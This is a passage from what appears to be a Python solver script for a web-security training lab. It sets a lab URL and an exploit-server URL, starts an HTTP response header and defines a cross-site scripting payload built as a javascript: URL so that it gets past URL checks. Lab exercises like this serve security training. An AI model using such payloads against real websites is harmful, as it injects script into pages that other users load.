...
LAB_URL = "https://0a63007604442bc787ed0f4900d900b1.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0a88006f04252b9087ba0e0001600091.exploit-server.net"

def main():
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    xss_payload = "javascript:print();//http:"
